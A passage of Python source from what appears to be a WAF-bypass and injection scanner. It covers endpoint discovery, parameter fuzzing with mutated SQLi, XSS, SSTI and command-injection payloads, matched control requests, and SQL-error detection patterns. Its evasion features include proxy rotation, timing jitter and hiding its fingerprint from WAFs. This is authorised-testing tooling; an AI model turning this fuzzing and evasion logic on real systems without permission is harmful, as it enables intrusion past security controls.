                    norm['response'] = public_response(response_snapshot)
                    norm.setdefault('status', response_snapshot.get('status', 0))
                    norm.setdefault('size', response_snapshot.get('size', 0))
                    norm.setdefault('url', str(getattr(raw_response, 'url', '') or ''))
                    parsed = urlsplit(norm.get('url') or '')
                    if parsed.scheme and parsed.netloc:
                        norm.setdefault('path', urlunsplit(('', '', parsed.path or '/',
                                                          parsed.query, '')))
                except Exception as exc:
                    logger.debug(f"Plugin response snapshot failed: {exc}")
                    norm['response'] = {
                        'status': int(getattr(raw_response, 'status_code', 0) or 0),
                        'size': 0, 'content_type': '', 'headers': {}, 'excerpt': '',
                    }
            elif raw_response is None:
                norm['response'] = {
                    'status': int(norm.get('status', 0) or 0), 'size': 0,
                    'content_type': '', 'headers': {}, 'excerpt': '',
                }
            norm['bypass'] = bool(item.get('bypass', item.get('success', False)))
            norm.setdefault('status', 0)
            norm.setdefault('headers', {})
            norm.setdefault('method', 'GET')
            norm.setdefault('size', 0)
            norm.setdefault(
                'technique', f"Plugin: {getattr(plugin, 'name', 'custom')}"
            )
            norm.setdefault('reason', item.get('message', 'Plugin result'))
            norm.setdefault('severity', 'INFO')
            norm.setdefault('category', 'PLUGIN')
            if norm['bypass'] and not norm.get('verification_status'):
                norm['verification_status'] = 'candidate'
                norm.setdefault('kind', 'suspected')
                norm.setdefault('confidence', 'medium')
            elif not norm['bypass']:
                norm.setdefault('verification_status', 'informational')
                norm.setdefault('kind', 'observation')
            normalized.append(norm)
        return normalized

    def _run_discovery(self) -> None:
        """Discover real endpoints + parameters via crawling and schema ingestion.

        Populates ``self.crawl_targets`` so that injection techniques fuzz live
        inputs instead of only probing ``/``.
        """
        discovered: Dict[str, Dict[str, Any]] = {}

        def _merge(items):
            for ep in items or []:
                path = ep.get('path') or '/'
                # Older/imported entries may still carry a query in ``path``.
                # Normalize it once and merge those values without duplicating ?.
                parsed_path = urlsplit(path)
                path = parsed_path.path or '/'
                incoming_params = dict(ep.get('params') or {})
                params = dict(parse_qsl(parsed_path.query, keep_blank_values=True))
                params.update(incoming_params)
                method = ep.get('method', 'GET')
                key = f"{method}:{path}:{','.join(sorted(params.keys()))}"
                if key not in discovered:
                    discovered[key] = {
                        'path': path, 'params': dict(params), 'method': method,
                        'headers': dict(ep.get('headers') or {}),
                        'body': ep.get('body'), 'url': ep.get('url'),
                    }

        # Seed from imported traffic first (HAR/Postman/Burp).
        if self.seed_targets:
            _merge(self.seed_targets)
            print(f"[*] Seeded {len(self.seed_targets)} imported request(s)")

        if self.enable_crawl:
            try:
                from .crawler import crawl_target
                print("[*] Crawling target for endpoints & parameters...")
                eps = crawl_target(self.target, self._session, timeout=self.timeout,
                                   limiter=self._limiter)
                _merge(eps)
                print(f"    Crawler found {len(eps)} parameterized endpoint(s)")
            except Exception as e:
                logger.debug(f"Crawl phase error: {e}")

        if self.enable_schema:
            try:
                from .schema_ingest import ingest_schemas
                print("[*] Ingesting OpenAPI/Swagger/GraphQL schemas...")
                eps = ingest_schemas(self.target, self._session, timeout=self.timeout)
                _merge(eps)
                print(f"    Schema ingestion found {len(eps)} endpoint(s)")
            except Exception as e:
                logger.debug(f"Schema phase error: {e}")

        self.crawl_targets = list(discovered.values())

        # Apply scope rules to discovered endpoints (exclude wins; an include
        # list restricts to matching paths/URLs).
        if (self._scope_inc or self._scope_exc) and self.crawl_targets:
            before = len(self.crawl_targets)
            self.crawl_targets = [
                t for t in self.crawl_targets
                if self._in_scope(f"{self.target}{t.get('path', '/')}")
            ]
            dropped = before - len(self.crawl_targets)
            if dropped:
                print(f"[*] Scope: dropped {dropped} out-of-scope endpoint(s)")

        if self.crawl_targets:
            print(f"[+] Discovery complete: {len(self.crawl_targets)} testable endpoint(s)")

    def _injection_targets(self) -> List[Dict[str, Any]]:
        """GET endpoints with parameters worth fuzzing.

        Falls back to a single root entry with a synthetic param so legacy probes
        still run when nothing was discovered.
        """
        targets = [t for t in self.crawl_targets
                   if t.get('method', 'GET') == 'GET' and t.get('params')]
        return targets

    def _fuzz_param_endpoints(self, payloads: List[str], technique_prefix: str,
                              category: str = None, max_endpoints: int = 15,
                              max_payloads: int = 8,
                              oracle: Optional[Dict[str, Any]] = None,
                              detector_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Inject ``payloads`` into each discovered parameter and batch-test.

        For every discovered GET endpoint, each parameter is fuzzed in turn while
        the other params keep their benign values, so requests stay realistic.
        """
        from .crawler import build_injection_path
        targets = self._injection_targets()
        if not targets:
            return []
        test_cases = []
        for ep in targets[:max_endpoints]:
            path, params = ep['path'], ep['params']
            for pname in params:
                for payload in payloads[:max_payloads]:
                    inj = build_injection_path(path, params, pname, payload)
                    control_path = build_injection_path(
                        path, params, pname, params.get(pname, 'blackthorn-control')
                    )
                    oracle_spec = dict(oracle or {})
                    if oracle_spec.get('value') == '$PAYLOAD':
                        oracle_spec['value'] = payload
                    if oracle_spec.get('type') == 'marker':
                        oracle_spec.setdefault('payload', payload)
                    test_cases.append({
                        'headers': {},
                        'path': inj,
                        'technique': f'{technique_prefix} [{pname}]: {payload[:30]}',
                        'category': category or 'INJECTION',
                        'payload': payload,
                        'parameter': pname,
                        'insertion_point': {'type': 'query', 'name': pname},
                        'detector_id': detector_id or 'parameter-differential-v2',
                        'oracle': oracle_spec or None,
                        'control': {'method': 'GET', 'path': control_path,
                                    'headers': {}, 'data': None},
                    })
        results = self._batch_test(test_cases) if test_cases else []
        if category:
            for r in results:
                r.setdefault('category', category)
        return results

    def _pack(self, category: str, mutate_each: bool = True) -> List[str]:
        """Build a fuzzing payload list from the built-in packs + mutation engine +
        any user custom payloads for this category."""
        try:
            from .mutations import expand_pack
            return expand_pack(category, extra=self.custom_payloads.get(category, []),
                               mutate_each=mutate_each)
        except Exception as e:
            logger.debug(f"_pack({category}) error: {e}")
            return list(self.custom_payloads.get(category, []))

    def _test_mutation_fuzzing(self) -> List[Dict[str, Any]]:
        """Fuzz discovered parameters with mutated evasion payloads across several
        injection classes (deterministic mutation engine, no AI required)."""
        if not self._injection_targets():
            return []
        print("  [*] Mutation fuzzing discovered parameters...")
        results = []
        for cat, label in [('sqli', 'SQLi-mut'), ('xss', 'XSS-mut'),
                           ('ssti', 'SSTI-mut'), ('cmd', 'CmdInj-mut')]:
            payloads = self._pack(cat)
            oracle = None
            detector = f'{cat}-mutation-differential-v2'
            if cat == 'sqli':
                oracle = {
                    'type': 'regex',
                    'patterns': [r'you have an error in your sql syntax',
                                 r'syntax error at or near', r'ora-\d{5}',
                                 r'unclosed quotation mark'],
                    'severity': 'HIGH',
                    'reason': 'Database error appeared only after the mutated SQL probe',
                }
            elif cat == 'xss':
                oracle = {
                    'type': 'reflection', 'value': '$PAYLOAD', 'severity': 'MEDIUM',
                    'reason': ('Mutated payload reflected verbatim; browser execution '
                               'and context are unverified'),
                }
            batch = self._fuzz_param_endpoints(
                payloads, label, category='INJECTION', max_payloads=6,
                max_endpoints=10, oracle=oracle, detector_id=detector,
            )
            # Mutation changes often produce a stable but harmless response
            # delta.  Only class-specific evidence is promoted here; the
            # dedicated SSTI and command scanners perform the stronger paired
            # execution checks for those classes.
            required_evidence = {
                'sqli': 'response_signature',
                'xss': 'unencoded_reflection',
            }.get(cat)
            if required_evidence:
                results.extend(
                    r for r in batch
                    if self._result_has_evidence(r, required_evidence)
                )
        return results

    @retry_on_network_error(max_retries=3, backoff_factor=0.5)
    def _get_baseline(self) -> Optional[requests.Response]:
        """
        Get baseline response for comparison with retry logic
        
        Returns:
            Response object or None
        
        Raises:
            TargetUnreachableError: If target cannot be reached after retries
        """
        try:
            # The baseline must use the exact authenticated/evasion/proxy session
            # used by probes.  A logged-out self._scoped_safe_request() baseline compared with
            # logged-in probes made almost every authenticated page look bypassed.
            kwargs = dict(
                method='GET', url=self.target, timeout=self.timeout,
                allow_redirects=False, verify=False,
            )
            if self.proxy_pool:
                proxy = random.choice(self.proxy_pool)
                kwargs['proxies'] = {'http': proxy, 'https': proxy}
            return self._session.request(**kwargs)
        except Exception as e:
            logger.error(f"Baseline request failed: {e}")
            raise
    
    def _log_http_transaction(self, method: str, url: str, request_headers: Dict, 
                              response: Optional[requests.Response], error: Optional[str] = None) -> None:
        """
        Log a full HTTP request/response transaction for forensic analysis
        
        Args:
            method: HTTP method used
            url: Request URL
            request_headers: Headers sent with request
            response: Response object (or None if error)
            error: Error message if request failed
        """
        if not self.enable_http_logging:
            return
        
        import datetime
        
        log_entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'request': {
                'method': method,
                'url': url,
                'headers': dict(request_headers) if request_headers else {}
            },
            'response': None,
            'error': error
        }
        
        if response is not None:
            try:
                log_entry['response'] = {
                    'status_code': response.status_code,
                    'reason': response.reason,
                    'headers': dict(response.headers),
                    'elapsed_ms': response.elapsed.total_seconds() * 1000 if hasattr(response, 'elapsed') else None,
                    'content_length': len(response.content) if response.content else 0,
                    'body_preview': response.text[:2000] if response.text else ''
                }
            except Exception:
                log_entry['response'] = {'error': 'Failed to capture response'}
        
        with self._http_log_lock:
            self._http_log.append(log_entry)
    
    def get_http_log(self) -> List[Dict[str, Any]]:
        """
        Get the full HTTP transaction log
        
        Returns:
            List of HTTP transaction log entries
        """
        with self._http_log_lock:
            return list(self._http_log)
    
    def analyze_ssl_tls(self) -> Dict[str, Any]:
        """
        Perform SSL/TLS analysis on the target
        
        Returns:
            Dictionary containing SSL/TLS information including:
            - Certificate details (subject, issuer, validity)
            - Cipher suite information
            - Protocol version
            - Security issues detected
        """
        if self._ssl_info:
            return self._ssl_info
        
        parsed = urlparse(self.target)
        if parsed.scheme != 'https':
            self._ssl_info = {
                'error': 'Target is not HTTPS',
                'ssl_enabled': False
            }
            return self._ssl_info
        
        host = parsed.netloc.split(':')[0]
        port = int(parsed.port) if parsed.port else 443
        
        ssl_info = {
            'ssl_enabled': True,
            'host': host,
            'port': port,
            'certificate': {},
            'cipher': {},
            'protocol': None,
            'security_issues': [],
            'certificate_chain': []
        }
        
        try:
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect and get SSL info
            with socket.create_connection((host, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    # Get cipher info
                    cipher_info = ssock.cipher()
                    if cipher_info:
                        ssl_info['cipher'] = {
                            'name': cipher_info[0],
                            'version': cipher_info[1],
                            'bits': cipher_info[2]
                        }
                    
                    # Get protocol version
                    ssl_info['protocol'] = ssock.version()
                    
                    # Get certificate
                    cert = ssock.getpeercert(binary_form=True)
                    if cert:
                        try:
                            from cryptography import x509  # type: ignore[reportMissingImports]
                            from cryptography.hazmat.backends import default_backend  # type: ignore[reportMissingImports]
                            
                            cert_obj = x509.load_der_x509_certificate(cert, default_backend())
                            
                            ssl_info['certificate'] = {
                                'subject': str(cert_obj.subject),
                                'issuer': str(cert_obj.issuer),
                                'serial_number': str(cert_obj.serial_number),
                                'not_valid_before': cert_obj.not_valid_before_utc.isoformat() if hasattr(cert_obj, 'not_valid_before_utc') else str(cert_obj.not_valid_before),
                                'not_valid_after': cert_obj.not_valid_after_utc.isoformat() if hasattr(cert_obj, 'not_valid_after_utc') else str(cert_obj.not_valid_after),
                                'signature_algorithm': cert_obj.signature_algorithm_oid._name if hasattr(cert_obj.signature_algorithm_oid, '_name') else str(cert_obj.signature_algorithm_oid),
                                'version': cert_obj.version.name,
                                'public_key_type': type(cert_obj.public_key()).__name__,
                                'public_key_bits': cert_obj.public_key().key_size if hasattr(cert_obj.public_key(), 'key_size') else 'Unknown'
                            }
                            
                            # Check for Subject Alternative Names
                            try:
                                san_ext = cert_obj.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                                san_names = [str(name.value) for name in san_ext.value]
                                ssl_info['certificate']['subject_alt_names'] = san_names
                            except Exception:
                                pass
                            
                            # Check certificate validity
                            import datetime
                            now = datetime.datetime.now(datetime.timezone.utc)
                            not_after = cert_obj.not_valid_after_utc if hasattr(cert_obj, 'not_valid_after_utc') else cert_obj.not_valid_after.replace(tzinfo=datetime.timezone.utc)
                            not_before = cert_obj.not_valid_before_utc if hasattr(cert_obj, 'not_valid_before_utc') else cert_obj.not_valid_before.replace(tzinfo=datetime.timezone.utc)
                            
                            if now > not_after:
                                ssl_info['security_issues'].append('Certificate has expired')
                            elif now < not_before:
                                ssl_info['security_issues'].append('Certificate not yet valid')
                            elif (not_after - now).days < 30:
                                ssl_info['security_issues'].append(f'Certificate expires in {(not_after - now).days} days')
                            
                        except ImportError:
                            # cryptography not available, use basic cert info
                            cert_dict = ssock.getpeercert()
                            if cert_dict:
                                ssl_info['certificate'] = {
                                    'subject': dict(x[0] for x in cert_dict.get('subject', [])),
                                    'issuer': dict(x[0] for x in cert_dict.get('issuer', [])),
                                    'not_before': cert_dict.get('notBefore'),
                                    'not_after': cert_dict.get('notAfter'),
                                    'serial_number': cert_dict.get('serialNumber')
                                }
                        except Exception as e:
                            ssl_info['certificate']['error'] = f'Failed to parse certificate: {str(e)}'
            
            # Check for security issues
            protocol = ssl_info.get('protocol', '')
            if protocol in ('SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.0'):
                ssl_info['security_issues'].append(f'Deprecated protocol: {protocol}')
            
            cipher_name = ssl_info.get('cipher', {}).get('name', '')
            weak_ciphers = ['RC4', 'DES', '3DES', 'MD5', 'NULL', 'EXPORT', 'ADH', 'AECDH']
            for weak in weak_ciphers:
                if weak in cipher_name.upper():
                    ssl_info['security_issues'].append(f'Weak cipher detected: {cipher_name}')
                    break
            
            cipher_bits = ssl_info.get('cipher', {}).get('bits', 0)
            if cipher_bits and cipher_bits < 128:
                ssl_info['security_issues'].append(f'Weak cipher strength: {cipher_bits} bits')
            
        except ssl.SSLError as e:
            ssl_info['error'] = f'SSL Error: {str(e)}'
            ssl_info['security_issues'].append(f'SSL Error: {str(e)}')
        except socket.timeout:
            ssl_info['error'] = 'Connection timeout'
        except socket.error as e:
            ssl_info['error'] = f'Socket error: {str(e)}'
        except Exception as e:
            ssl_info['error'] = f'Analysis failed: {str(e)}'
        
        self._ssl_info = ssl_info
        return ssl_info
    
    def get_ssl_info(self) -> Dict[str, Any]:
        """Get cached SSL/TLS analysis results"""
        return self._ssl_info if self._ssl_info else self.analyze_ssl_tls()

    @staticmethod
    def _stable_request_key(method: str, url: str, headers: Dict[str, Any], data: Any,
                            context: Any = None) -> str:
        """Stable cache key for a wire request plus its detection context."""
        material = json.dumps({
            'method': method.upper(), 'url': url,
            'headers': sorted((str(k).lower(), str(v)) for k, v in (headers or {}).items()),
            'data': data, 'context': context,
        }, sort_keys=True, default=repr, separators=(',', ':'))
        return hashlib.sha256(material.encode('utf-8', errors='replace')).hexdigest()

    @staticmethod
    def _result_has_evidence(result: Optional[Dict[str, Any]], *types: str) -> bool:
        if not isinstance(result, dict):
            return False
        wanted = set(types)
        return any(
            isinstance(item, dict) and item.get('type') in wanted
            for item in (result.get('evidence') or [])
        )

    @staticmethod
    def _benign_control_body(data: Any) -> Any:
        """Create a syntax-preserving, non-attack body for a matched control."""
        if data is None:
            return None

        def _replace(value):
            if isinstance(value, dict):
                return {k: _replace(v) for k, v in value.items()}
            if isinstance(value, list):
                return [_replace(v) for v in value]
            if isinstance(value, bool):
                return False
            if isinstance(value, (int, float)):
                return 1
            if value is None:
                return None
            return 'blackthorn-control'

        if isinstance(data, (dict, list)):
            return _replace(data)
        if isinstance(data, bytes):
            return b'blackthorn-control'
        if isinstance(data, str):
            try:
                decoded = json.loads(data)
                return json.dumps(_replace(decoded), separators=(',', ':'))
            except Exception:
                pass
            try:
                pairs = parse_qsl(data, keep_blank_values=True)
                if pairs and ('=' in data or '&' in data):
                    return urlencode([(k, 'blackthorn-control') for k, _ in pairs])
            except Exception:
                pass
            return 'blackthorn-control'
        return 'blackthorn-control'

    def _derive_control_request(self, method: str, path: str, headers: Dict[str, Any],
                                data: Any, probe: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Derive the clean request that differs only at the tested input.

        Callers can provide ``probe['control']`` for an exact canonical request.
        Query probes are automatically rebuilt with benign values. Header, body,
        and method probes use the same route with the mutation removed.
        """
        explicit = probe.get('control')
        if explicit is False:
            return None
        if isinstance(explicit, dict):
            return {
                'method': str(explicit.get('method') or method).upper(),
                'path': str(explicit.get('path') or path),
                'headers': dict(explicit.get('headers') or {}),
                'data': explicit.get('data'),
            }

        parts = urlsplit(path)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        parameter = probe.get('parameter')
        if not parameter and isinstance(probe.get('insertion_point'), dict):
            parameter = probe['insertion_point'].get('name')
        if pairs:
            replaced = []
            for key, value in pairs:
                if not parameter or key == parameter:
                    value = 'blackthorn-control'
                replaced.append((key, value))
            control_path = urlunsplit(('', '', parts.path or '/', urlencode(replaced), parts.fragment))
            return {
                'method': method.upper(), 'path': control_path,
                'headers': dict(headers or {}), 'data': None,
            }

        if data is not None:
            # Preserve the media type so a JSON/XML endpoint is compared with the
            # same parser, while removing unrelated mutation headers.
            # The body is the mutation, so preserve all endpoint-specific
            # headers (tenant/version/media-type) in the benign request.
            keep_headers = dict(headers or {})
            return {
                'method': method.upper(), 'path': path,
                'headers': keep_headers, 'data': self._benign_control_body(data),
            }

        if headers:
            insertion = probe.get('insertion_point')
            if isinstance(insertion, dict) and insertion.get('type') == 'header':
                injected_name = str(insertion.get('name') or '').lower()
                clean_headers = {
                    k: v for k, v in headers.items()
                    if str(k).lower() != injected_name
                }
            else:
                # Legacy header techniques treat all supplied headers as the
                # mutation and compare with the same route without them.
                clean_headers = {}
            return {
                'method': method.upper(), 'path': path,
                'headers': clean_headers, 'data': None,
            }

        if method.upper() != 'GET':
            return {'method': 'GET', 'path': path, 'headers': {}, 'data': None}

        # A path-only mutation needs an explicit canonical path. Falling back to
        # the root baseline keeps legacy coverage but is labelled global/low.
        return None

    def _path_url(self, path: str) -> str:
        if str(path).startswith(('http://', 'https://')):
            return str(path)
        return f"{self.target}{path}"

    def _same_target_origin(self, url: str) -> bool:
        try:
            target = urlparse(self.target)
            candidate = urlparse(url)
            return (candidate.scheme.lower(), candidate.hostname, candidate.port or
                    (443 if candidate.scheme.lower() == 'https' else 80)) == (
                        target.scheme.lower(), target.hostname, target.port or
                        (443 if target.scheme.lower() == 'https' else 80)
                    )
        except Exception:
            return False

    def _get_control_snapshot(self, request_spec: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        method = str(request_spec.get('method') or 'GET').upper()
        path = str(request_spec.get('path') or '/')
        url = self._path_url(path)
        # Never carry the authenticated target session to another origin.
        if not self._same_target_origin(url) or not self._in_scope(url):
            logger.debug(f"Control request blocked by origin/scope guard: {url}")
            return None
        extra_headers = dict(request_spec.get('headers') or {})
        data = request_spec.get('data')
        req_headers = dict(self._session.headers)
        req_headers.update(extra_headers)
        cache_key = self._stable_request_key(method, url, req_headers, data, 'control')
        with self._cache_lock:
            cached = self._control_cache.get(cache_key)
            if cached is not None:
                return dict(cached)

        kwargs = dict(
            method=method, url=url, headers=req_headers, data=data,
            timeout=self.timeout, allow_redirects=False, verify=False,
        )
        if self.proxy_pool:
            proxy = random.choice(self.proxy_pool)
            kwargs['proxies'] = {'http': proxy, 'https': proxy}
        self._limiter.acquire()
        try:
            response = self._session.request(**kwargs)
            self._log_http_transaction(method, url, req_headers, response)
            if response is None:
                return None
            snap = snapshot_response(response, _normalize_body)
            snap['request'] = {
                'method': method, 'path': path, 'url': url,
                'headers': extra_headers, 'body': data,
            }
            with self._cache_lock:
                self._control_cache[cache_key] = snap
            return dict(snap)
        except Exception as exc:
            logger.debug(f"Matched control request failed for {method} {path}: {exc}")
            return None
        finally:
            self._limiter.release()

    def _root_control_snapshot(self) -> Dict[str, Any]:
        headers = {str(k).lower(): str(v) for k, v in (self._baseline_headers or {}).items()}
        safe_names = {
            'content-type', 'content-length', 'location', 'server', 'x-powered-by',
            'cache-control', 'vary', 'www-authenticate', 'content-security-policy',
        }
        body = self._baseline_body_sample or ''
        return {
            'status': int(self._baseline_status or 0),
            'size': int(self._baseline_size or 0),
            'content_type': headers.get('content-type', ''),
            'location': headers.get('location', ''),
            'headers': headers,
            'safe_headers': {k: v for k, v in headers.items() if k in safe_names},
            'hash': hashlib.sha256(body.encode('utf-8', errors='replace')).hexdigest(),
            'text': body,
            'normalized': self._baseline_norm or _normalize_body(body),
            'request': {'method': 'GET', 'path': '/', 'url': self.target,
                        'headers': {}, 'body': None},
        }

    def _test_request(
        self,
        headers: Optional[dict] = None,
        method: str = 'GET',
        path: str = '/',
        technique: Optional[str] = None,
        data: Any = None,
        use_cache: bool = True,
        probe: Optional[Dict[str, Any]] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Test a single request configuration with error handling.

        The technique label is tracked out-of-band: ``X-Technique`` is NEVER sent
        to the target (it would fingerprint the scanner and trip custom-header WAF
        rules). If a legacy caller passes ``X-Technique`` inside ``headers`` it is
        popped off and used as the technique label only.

        Args:
            headers: Request headers (X-Technique, if present, is stripped)
            method: HTTP method
            path: URL path (may include a query string)
            technique: Human-readable technique label (kept off the wire)
            data: Optional request body

        Returns:
            Result dictionary or None if request failed
        """
        method = str(method or 'GET').upper()
        url = self._path_url(path)

        # Work on a private copy and strip the out-of-band technique marker so it
        # never reaches the target and never pollutes the cache key.
        headers = dict(headers) if headers else {}
        marker = headers.pop('X-Technique', None)
        if technique is None:
            technique = marker or 'Unknown'
        probe = dict(probe or {})

        # The authenticated scanner transport is target-origin only. This blocks
        # accidental bearer/cookie leakage when a technique supplies an absolute
        # third-party URL and enforces user scope at the request chokepoint.
        if not self._same_target_origin(url) or not self._in_scope(url):
            logger.debug(f"Probe blocked by origin/scope guard: {url}")
            return None

        # Establish a benign control before sending the mutation. Query/body/
        # header/method probes receive a matched control; legacy path-only probes
        # fall back to the scan root and are explicitly labelled low-confidence.
        control_spec = self._derive_control_request(method, path, headers, data, probe)
        control_snapshot = self._get_control_snapshot(control_spec) if control_spec else None
        control_scope = 'matched' if control_snapshot is not None else 'global'
        if control_snapshot is None:
            control_snapshot = self._root_control_snapshot()

        # Verdicts depend on both the wire request and oracle/control context.
        cache_key = self._stable_request_key(method, url, headers, data, probe)

        # Check cache first (now actually hits, because the key is technique-free).
        # Re-confirmation replays pass use_cache=False so they hit the network
        # instead of being served a stale "bypass" verdict.
        if use_cache:
            with self._cache_lock:
                if cache_key in self._response_cache:
                    cached = dict(self._response_cache[cache_key])
                    cached['technique'] = technique  # keep caller's label
                    return cached

        req_headers = dict(self._session.headers)
        req_headers.update(headers)

        # Adaptive concurrency: bound in-flight requests and pace under pushback.
        self._limiter.acquire()
        try:
            req_kwargs = dict(
                method=method, url=url, headers=req_headers, data=data,
                timeout=self.timeout, allow_redirects=False, verify=False,
            )
            # Per-request proxy rotation (thread-safe: not mutating the session).
            if self.proxy_pool:
                proxy = random.choice(self.proxy_pool)
                req_kwargs['proxies'] = {'http': proxy, 'https': proxy}
            resp = self._session.request(**req_kwargs)

            # Log HTTP transaction for forensic analysis
            self._log_http_transaction(method, url, req_headers, resp)

            if resp is None:
                return None

            # Rate limit detection and adaptive throttle
            if resp.status_code in [429, 503]:
                self._handle_rate_limit(resp)
                self._limiter.penalize()
            else:
                self._limiter.reward()

            # Authenticated scanning: re-login if the session looks expired.
            if resp.status_code in (401, 403) and (self.auth or {}).get('login'):
                self._maybe_reauth(resp)

            # Pacing delay (may have been adjusted by rate-limit handling),
            # plus optional random jitter to defeat rate-based heuristics.
            if self.delay > 0:
                time.sleep(self.delay)
            if self.jitter > 0:
                time.sleep(random.uniform(0, self.jitter))

            # Compare with the matched control and apply any detector-specific
            # proof oracle (marker/signature/header/reflection).
            bypass_result = self._is_bypass_fast(
                resp, control_snapshot=control_snapshot,
                oracle=probe.get('oracle'), control_scope=control_scope,
            )
            observed_snapshot = snapshot_response(resp, _normalize_body)

            parameter = probe.get('parameter')
            insertion_point = probe.get('insertion_point')
            payload = probe.get('payload')
            if (not parameter or payload is None) and urlsplit(path).query:
                pairs = parse_qsl(urlsplit(path).query, keep_blank_values=True)
                if pairs:
                    if parameter:
                        selected = next(((k, v) for k, v in pairs if k == parameter), pairs[-1])
                    else:
                        selected = pairs[-1]
                    parameter = parameter or selected[0]
                    if payload is None:
                        payload = selected[1]
            if insertion_point is None and parameter:
                insertion_point = {'type': 'query', 'name': parameter}

            category = str(probe.get('category') or 'OTHER')
            fingerprint_material = '|'.join([
                urlparse(self.target).netloc.lower(), method,
                urlsplit(path).path or '/', category,
                str((insertion_point or {}).get('type', '') if isinstance(insertion_point, dict) else insertion_point),
                str((insertion_point or {}).get('name', '') if isinstance(insertion_point, dict) else ''),
                str(technique).split(':', 1)[0].strip().lower(),
            ])
            fingerprint = hashlib.sha256(fingerprint_material.encode()).hexdigest()[:24]

            result = {
                'bypass': bypass_result['bypass'],
                'status': resp.status_code,
                'headers': dict(headers),
                'method': method,
                'path': path,
                'url': url,
                'target': self.target,
                'size': len(resp.content),
                'technique': technique,
                'reason': bypass_result['reason'],
                'severity': bypass_result['severity'],
                'category': category,
                'kind': bypass_result.get('kind', 'observation'),
                'verification_status': bypass_result.get('verification_status', 'not_detected'),
                'confidence': bypass_result.get('confidence', 'none'),
                'comparison': bypass_result.get('comparison', {}),
                'evidence': bypass_result.get('evidence', []),
                'request': {
                    'method': method, 'url': url, 'path': path,
                    'headers': dict(headers), 'body': data,
                },
                'response': public_response(
                    observed_snapshot, bypass_result.get('evidence_needle', '')
                ),
                'baseline': {
                    **public_response(control_snapshot),
                    'scope': control_scope,
                    'request': dict(control_snapshot.get('request') or {}),
                },
                'insertion_point': insertion_point,
                'payload': payload if payload is not None else '',
                'detector_id': probe.get('detector_id') or 'response-differential-v2',
                'fingerprint': fingerprint,
                'finding_id': f'bt-{fingerprint}',
                'probe': probe,
            }

            # Attach a copy-paste reproduction command built from the request as
            # it actually went on the wire (full headers + body), so any finding
            # can be independently verified.
            try:
                result['curl'] = build_curl(method, url, req_headers, data)
            except Exception:
                pass

            # Keep the body so the re-confirmation pass can replay the exact
            # request (GET findings store None; harmless).
            if data is not None:
                result['data'] = data

            # Cache result
            if use_cache:
                with self._cache_lock:
                    self._response_cache[cache_key] = result

            return result

        except requests.exceptions.Timeout:
            logger.debug(f"Timeout for {method} {path}")
            self._log_http_transaction(method, url, req_headers, None, error='Timeout')
            return None
        except requests.exceptions.ConnectionError as e:
            logger.debug(f"Connection error for {method} {path}")
            self._log_http_transaction(method, url, req_headers, None, error=f'Connection error: {str(e)}')
            return None
        except Exception as e:
            logger.debug(f"Request failed for {method} {path}: {e}")
            self._log_http_transaction(method, url, req_headers, None, error=str(e))
            return None
        finally:
            self._limiter.release()
    
    def _is_bypass_fast(
        self,
        response: requests.Response,
        control_snapshot: Optional[Dict[str, Any]] = None,
        oracle: Optional[Dict[str, Any]] = None,
        control_scope: str = 'global',
    ) -> Dict[str, Any]:
        """Evidence-aware response classification.

        A generic response delta is only a candidate. Confirmed findings require
        a matched blocked→allowed transition or a detector-specific proof oracle.
        HTTP 5xx bodies are still inspected so error-based injection is visible.
        """
        if self._baseline_size is None and control_snapshot is None:
            return {
                'bypass': False, 'reason': 'No comparison control',
                'severity': 'INFO', 'confidence': 'none',
                'verification_status': 'not_detected', 'kind': 'observation',
                'comparison': {}, 'evidence': [],
            }
        try:
            observed = snapshot_response(response, _normalize_body)
            control = control_snapshot or self._root_control_snapshot()
            return analyze_response(
                observed, control, oracle=oracle, control_scope=control_scope,
            )
        except Exception as e:
            logger.debug(f"Bypass detection error: {e}")
            return {
                'bypass': False, 'reason': f'Detection error: {e}',
                'severity': 'INFO', 'confidence': 'none',
                'verification_status': 'error', 'kind': 'observation',
                'comparison': {}, 'evidence': [],
            }
    
    def _handle_rate_limit(self, response: requests.Response):
        """Handle rate limit detection and auto-adjust delay."""
        if self._rate_limit_adjustments >= 5:
            # Already adjusted too many times, don't increase further
            return
        
        self._rate_limit_detected = True
        self._rate_limit_adjustments += 1
        
        # Check for Retry-After header
        retry_after = response.headers.get('Retry-After')
        if retry_after:
            try:
                wait_time = int(retry_after)
                self.delay = min(wait_time, self._max_delay)
                print(f"[!] Rate limit detected! Using Retry-After header: delay = {self.delay}s")
                time.sleep(wait_time)
                return
            except ValueError:
                pass
        
        # Exponential backoff: double the delay each time
        new_delay = min(self.delay * 2, self._max_delay)
        if new_delay > self.delay:
            self.delay = new_delay
            print(f"[!] Rate limit detected! Adjusting delay to {self.delay:.1f}s (adjustment #{self._rate_limit_adjustments})")
        
        # Wait before retrying
        time.sleep(self.delay)
    
    def _is_bypass(self, response: requests.Response) -> Dict[str, Any]:
        """Determine if response indicates WAF bypass with detailed reasoning"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        # Ignore error responses (4xx, 5xx) - these are NOT bypasses
        if response.status_code >= 400:
            return {'bypass': False, 'reason': f'Blocked: {response.status_code}', 'severity': 'INFO'}
        
        try:
            current_size = len(response.content)
            current_hash = hashlib.md5(response.content).hexdigest()
            raw_diff = abs(current_size - self._baseline_size)
            size_diff = max(0, raw_diff - self._baseline_jitter)
            size_diff_percent = (size_diff / self._baseline_size) * 100 if self._baseline_size > 0 else 0

            # CRITICAL: Status code changed from blocked to allowed
            if self._baseline_status in [403, 401] and response.status_code == 200:
                return {
                    'bypass': True,
                    'reason': f'Authentication bypass: {self._baseline_status} → {response.status_code}',
                    'severity': 'CRITICAL'
                }

            # HIGH: Significant size difference beyond jitter (different content)
            if size_diff_percent > 10:
                return {
                    'bypass': True,
                    'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% beyond ±{self._baseline_jitter}b jitter)',
                    'severity': 'HIGH'
                }

